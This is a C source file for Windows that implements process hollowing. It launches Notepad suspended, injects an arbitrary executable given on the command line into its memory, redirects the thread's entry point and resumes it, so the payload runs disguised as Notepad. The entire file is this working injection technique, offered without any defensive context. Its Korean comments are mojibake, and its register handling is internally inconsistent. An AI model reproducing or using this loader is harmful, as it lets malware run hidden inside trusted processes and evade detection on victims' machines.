#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);

typedef struct _FLOATING_SAVE_AREA
{
	ULONG ControlWord;
	ULONG StatusWord;
	ULONG TagWord;
	ULONG ErrorOffset;
	ULONG ErrorSelector;
	ULONG DataOffset;
	ULONG DataSelector;
	UCHAR RegisterArea[80];
	ULONG Cr0NpxState;
} FLOATING_SAVE_AREA, * PFLOATING_SAVE_AREA;


int main(int argc, const char* argv[]) {
	PIMAGE_DOS_HEADER pDosH;
	PIMAGE_NT_HEADERS pNtH;
	PIMAGE_SECTION_HEADER pSecH;

	PVOID image, mem, base;
	DWORD i, read, nSizeOfFile;
	HANDLE hFile;

	STARTUPINFO si = { sizeof(si) }; //TARTUPINFO ����ü �������� ���μ����� �Ӽ� ������ ����
	PROCESS_INFORMATION pi; //������ ���μ��� ������ ��� ����ü (���� ������ ����)
	char szCommandLine[] = TEXT("NOTEPAD");
	
	CONTEXT tContext;
	tContext.ContextFlags = CONTEXT_FULL;



	if (!CreateProcess(NULL, szCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("\nCreateProcess false... %d \n", GetLastError());
		return 1;
	}


	//��ü�� ���α׷��� ���� �������� ����α����� CreateFile.
	hFile = CreateFile(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("\nCreateFile false... \n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}

	nSizeOfFile = GetFileSize(hFile, NULL);

	image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL)) {
		printf("\nReadFile false... \n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}
	NtClose(hFile);


	//�ñ״�ó üũ
	pDosH = (PIMAGE_DOS_HEADER)image;
	if (pDosH->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("\nInvalid execute format.\n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}

	//DOS_HEADER�� e_lfanew �� ���ؼ� NT_HEADER�� ���� ����. IMAGE_NT_HEADER �ּ� ���
	pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pDosH->e_lfanew);

	// �ڽ����μ����� ���� �������� ���ؽ�Ʈ���.
	// pi ����ü�� ������ �κп��� ���� �������� ���¸� _CONTEXT ����ü�� �ʱ�ȭ.. �� �����������κ�
	NtGetContextThread(pi.hThread, &tContext);


	//Ÿ�� ���μ���(������) PEB�κ��� ImageBase address ���
	//ebx �������Ϳ��� PEB �ּҸ� �������� PEB���� ���� �̹����� �⺻ �ּҸ� ����
	NtReadVirtualMemory(pi.hProcess, (PVOID)(tContext.Rdx + (sizeof(SIZE_T)*2)), &base, sizeof(PVOID), NULL);
	
	// ���� ���� �̹����� ��ü�� �������ϰ� �ּҰ� �����ϴٸ� �ڽ����μ������� ���� ���������� �ٷ� �������.
	if ((SIZE_T)base == pNtH->OptionalHeader.ImageBase) {
		printf("\nrebase���ʿ䰡 ����. �ٷ� ����� \n");
		NtUnmapViewOfSection(pi.hProcess, base);
	}


	// ����ε� �ּҰ����� ���ο� ������� �Ҵ�. 
	//suspended ������ ���μ����� imagebase�κп� ��ü�� ������ SizeOfImage��ŭ ���󿵿� �Ҵ�.
	// ���� �ش� �ּҺκ��� ���ε� ���¸� ����.
	printf("\n�ڽ����μ��� �ȿ� �޸𸮸� �Ҵ��Ѵ� ġ�� \n");
	mem = VirtualAllocEx(pi.hProcess, (PVOID)pNtH->OptionalHeader.ImageBase, pNtH->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);

	if (!mem) {
		printf("\nVirtualAllocEx false... \n");
		NtTerminateProcess(pi.hProcess,1);
		return 1;
	}
	printf("\n�޸� �Ҵ�. Address: %#zx\n", (SIZE_T)mem);


	// �Ҵ�� ��������� Write
	// OPTIONAL_HEADER�� Write�� �� ���� ������ŭ ��� ���ǿ� �� ����.
	NtWriteVirtualMemory(pi.hProcess,mem,image,pNtH->OptionalHeader.SizeOfHeaders,NULL);

	for (i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {
		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)mem + pSecH->VirtualAddress), (PVOID)((LPBYTE)image + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL);
	}


	// CONTEXT ����ü ������ �� ������ �簡��
	//���Ե� �̹����� �������� rax �������� ����
	tContext.Rax = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint);
	printf("New EP: %#zx\n", tContext.Rax);

	NtWriteVirtualMemory(pi.hProcess, (PVOID)(tContext.Rbx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	printf("\n�ڽ����μ����� ���ν����� ���ؽ�Ʈ�� ���õ�. \n");
	NtSetContextThread(pi.hThread, &tContext);

	printf("\n�̾� �簡�� �Ѵ���!! \n");
	NtResumeThread(pi.hThread, NULL);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	VirtualFree(image, 0, MEM_RELEASE);
	return 0;
}